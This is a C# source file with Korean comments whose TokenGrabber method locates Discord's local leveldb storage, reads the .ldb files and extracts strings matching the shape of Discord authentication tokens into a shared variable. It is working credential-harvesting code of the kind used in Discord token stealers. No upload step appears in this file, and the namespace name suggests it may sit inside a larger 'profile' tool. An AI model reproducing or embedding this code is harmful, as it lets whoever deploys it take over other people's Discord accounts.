using System;
using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;


namespace Discord_Profile
{

    class Token
    {
        //토큰 저장 파일 이름
        static List<string> files = new List<string>();

        //토큰 글자수 (상수)
        const int tokenLength = 59;

        //메인 함수
        public static void TokenGrabber()
        {

            //디코 Path 에 있는 파일을 가져오기 (*.ldb 파일)
            files = GetFile();

            //만약 받아온 파일이 없다면?
            if (files.Count == 0)
            {
                Console.WriteLine("디스코드가 발견되지 않았습니다");
                return;
            }

            //받아온 파일중에 토큰 찾기
            GetToken();



        }
         
        private static List<string> GetFile()
        {
            //리턴할 값
            List<string> files = new List<string>();

            //디스코드 path (디스코드 토큰 파일이 있는 위치)
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

            //디스코드 path 가 없다면
            if (!Directory.Exists(discordPath))
            {
                Console.WriteLine("디스코드가 없으시군요!\n 디스코드 path 를 발견하지 못하였습니다.");
                return files;
            }

            //key 가 들어있는 파일을 찾을려고 선언
            string key = "token";

            //.ldb 파일 찾기
            string[] ldbFiles = System.IO.Directory.GetFiles(discordPath, "*.ldb");

            //파일을 하나 하나씩 토큰이 있는지 확인
            foreach (string ldb in ldbFiles)
            {
                //한 파일을 읽어들임
                string textFile = File.ReadAllText(ldb);

                //key (token) 이 포함되면 실행
                if (textFile.Contains(key))
                {

                    //토큰이 있는 파일에 추가
                    files.Add(textFile);
                }
            }


            return files;

        }

        private static void GetToken()
        {

            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*")) //정규식을 이용해 문자열을 나눔
                {
                    if (match.Length == tokenLength) //토큰의 문자수는 반드시 59 이므로 이미 선언해논 tokenLength 를 이용
                    {
                        int i = 0;
                        foreach( var a in match.ToString())
                        {
                            if (a == '.')
                            {
                                i++;
                            }
                        }
                        if (i == 2)
                        {
                            i = 0;
                            foreach (var a in match.ToString())
                            {
                                i++;
                                if (a == '.')
                                {
                                    break;
                                }




                            }
                            if (i == 25)
                            {
                                //토큰을 찾는다면?
                                Data.token = match.ToString();

                            }
                        }


                    }
                }
            }
        }



    }
}